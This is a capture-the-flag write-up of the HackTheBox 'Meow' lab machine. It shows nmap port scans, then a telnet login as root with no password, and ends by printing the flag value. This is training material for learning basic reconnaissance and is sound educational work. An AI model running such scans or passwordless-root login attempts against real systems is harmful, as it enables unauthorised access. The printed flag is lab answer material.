---
title: "HTB - Starting Point: Meow"
date: 2022-05-20
---

Meow is the first machine in HackTheBox's relatively new beginner path "Starting Point". It is used to teach basics, in the case of this machine, `nmap` and `telnet` specificaly.

## Box Information

| **Name:** | **Meow** |
|-----------|----------|
| OS:       | Linux    |
| Difficulty:| Very Easy |


## Recon

### nmap
`nmap` finds one open TCP port: Telnet (23).
```
kali@kali$ nmap -p- 10.129.189.95
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 16:18 EDT
Nmap scan report for 10.129.189.95
Host is up (0.15s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds
```

```
kali@kali$ nmap -p 23 -sCV 10.129.189.95
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 16:19 EDT
Nmap scan report for 10.129.189.95
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.56 seconds
```

### telnet
Telnet is an application protocol used on the Internet to provide bidirectional interactive text-oriented communication facility using a virtual terminal connection. We connect to the mahine using `telnet 10.129.189.95`

```
kali@kali$ telnet 10.129.189.95
Trying 10.129.189.95...
Connected to 10.129.189.95.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 20 May 2022 08:29:31 PM UTC

  System load:           0.18
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             145
  Users logged in:       0
  IPv4 address for eth0: 10.129.189.95
  IPv6 address for eth0: dead:beef::250:56ff:feb9:9db7

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
```

Upon being asked for login information, we try connecting to `root`, which we find has been misconfigured and doesn't have a password.
Now that we are in, we just need to get our flag.

```
Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~#
```
